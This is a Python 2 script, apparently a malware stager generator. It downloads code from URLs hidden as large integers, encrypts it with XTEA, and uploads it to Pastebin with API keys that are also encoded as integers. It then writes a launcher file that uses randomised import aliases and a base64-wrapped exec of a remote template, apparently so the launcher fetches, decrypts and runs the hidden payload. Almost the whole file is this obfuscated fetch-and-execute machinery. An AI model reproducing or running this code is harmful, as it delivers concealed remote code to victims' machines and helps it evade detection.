#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

''' 

,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88

'''

import os
import sys
import struct
import base64
import random
import urllib
import urllib2
import tempfile


padding     = '{'
pad         = lambda s: str(s) + (8 - len(str(s)) % 8) * padding
chunk       = lambda s: [s[i * 8:((i + 1) * 8)] for i in range(len(s) // 8)]
xor         = lambda s,t: "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
template    = 12095051301478169748777225282050429328988589300942044190524178307978800637761077
launcher    = 12095051301478169748777225282050429328988589300942044190524181121075829415236930
api_key     = 45403374382296256540634757578741841255664469235598518666019748521845799858739
usr_key     = 44950723374682332681135159727133190002449269305072810017918864160473487587633
adjectives  = [i.title().replace('-','') for i in urllib2.urlopen('https://raw.githubusercontent.com/hathcox/Madlibs/master/adjective.list').read().split()]
nouns       = [i.title().replace('-','') for i in urllib2.urlopen('https://raw.githubusercontent.com/hathcox/Madlibs/master/nouns.list').read().split()]
pastebin    = lambda s: _post('https://pastebin.com/api/api_post.php', data={'api_option': 'paste', 'api_paste_code': s, 'api_dev_key': bytes(bytearray.fromhex(hex(long(api_key)).strip('0x').strip('L'))), 'api_user_key': bytes(bytearray.fromhex(hex(long(usr_key)).strip('0x').strip('L')))})
random_key  = lambda n: str().join(random.choice([chr(i) for i in range(48, 123) if chr(i).isalnum()]) for x in range(n))
random_var  = lambda: adjectives.pop(adjectives.index(random.choice(adjectives))) + adjectives.pop(adjectives.index(random.choice(adjectives))) + nouns.pop(nouns.index(random.choice(nouns)))


def _post(url, headers={}, data={}):
        dat = urllib.urlencode(data) if data else None
        req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
        for key, value in headers.items():
            req.add_header(key, value)
        return urllib2.urlopen(req).read()

def _encrypt(block, key):
    v0, v1 = struct.unpack('!' + "2L", block)
    k = struct.unpack('!' + "4L", key)
    sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
    for round in range(32):
        v0 = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
        sum = (sum + delta) & mask
        v1 = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
    return struct.pack('!' + "2L", v0, v1)

def generate_launcher():
    code        = urllib2.urlopen(bytes(bytearray.fromhex(hex(long(launcher)).strip('0x').strip('L')))).read()
    output_file = tempfile.mktemp(suffix='.py')
    key         = random_key(16)
    pkg         = {'b64decode':'base64','unpack':'struct','pack':'struct','urlopen':'urllib'}
    var         = {k: random_var() for k in pkg}
    imports     = ['from {} import {} as {}'.format(v, k, var[k]) for k,v in pkg.items()]
    data        = pad(code)
    blocks      = chunk(data)
    vector      = os.urandom(8)
    result      = [vector]
    for block in blocks:
        encode  = xor(vector, block)
        output  = vector = _encrypt(encode, key)
        result.append(output)
    result      = base64.b64encode(b''.join(result))
    output      = os.path.split(pastebin(result))
    output      = output[0] + '/raw/' + output[1]
    target      = bytes(long(output.encode('hex'), 16))
    framework   = urllib2.urlopen(bytes(bytearray.fromhex(hex(long(template)).strip('0x').strip('L')))).read()
    with file(output_file, 'w') as fp:
        fp.write(";".join(imports) + "\n")
        fp.write("exec(%s(\"%s\"))" % (var['b64decode'], base64.b64encode(framework.replace('__B64__', var['b64decode']).replace('__UNPACK__', var['unpack']).replace('__PACK__', var['pack']).replace('__URLOPEN__', var['urlopen']).replace('__TARGET__', target).replace('__KEY__', key))))
    print output_file    

if __name__ == '__main__':
    generate_launcher()
